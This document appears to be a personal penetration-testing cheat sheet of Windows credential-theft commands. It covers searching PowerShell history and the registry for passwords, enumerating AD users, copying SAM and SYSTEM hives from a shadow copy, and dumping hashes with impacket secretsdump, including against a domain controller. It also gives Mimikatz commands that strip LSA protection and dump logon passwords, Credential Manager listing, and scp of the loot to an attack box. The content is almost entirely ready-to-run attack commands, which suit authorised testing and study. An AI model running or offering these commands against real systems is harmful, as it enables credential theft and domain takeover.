# References

# Notes


# Commands

~~~
C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\<filename>.txt
~~~

Query Registry & Findstr
~~~
>reg query HKLM /f password /t REG_SZ /s | findstr flag
>
~~~

Query Registry
~~~
reg query HKLM /f password /t REG_SZ /s
~~~

Get Aduser
~~~
Get-ADUser -Filter * -Properties * | select Name, SamAccountName, Description
~~~

Create VSS from admin
~~~
wmic shadowcopy call create Volume='C:\'
~~~

List shadows
~~~
vssadmin list shadows
~~~

SecretsDump.py
~~~
python3.9 /opt/impacket/examples/secretsdump.py -sam sam -system system LOCAL
~~~

~~~
python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm <Domain>/<AD_Admin_User>@<ip>
~~~

Copy to desktop
~~~
adminprompt>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
~~~

~~~
adminprompt>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\ssystem C:\users\Administrator\Desktop\system
~~~

SCP to linux (change attack passwd)
~~~
scp <file> <user>r@<ip>:<directory>
~~~

Mimikatz remove LSA Protection
~~~
!processprotect /process:lsass.exe /remove
~~~

Mimikatz dump NTLM
~~~
sekurlsa::logonpasswords
~~~

Windows Cred Manager 
~~~
vaultcmd /list
VaultCmd /listproperties:"Web Credentials"
VaultCmd /listcreds:"Web Credentials"
~~~

Runas Example
~~~
runas /savecred /user:<user>\<domain> cmd.exe
~~~

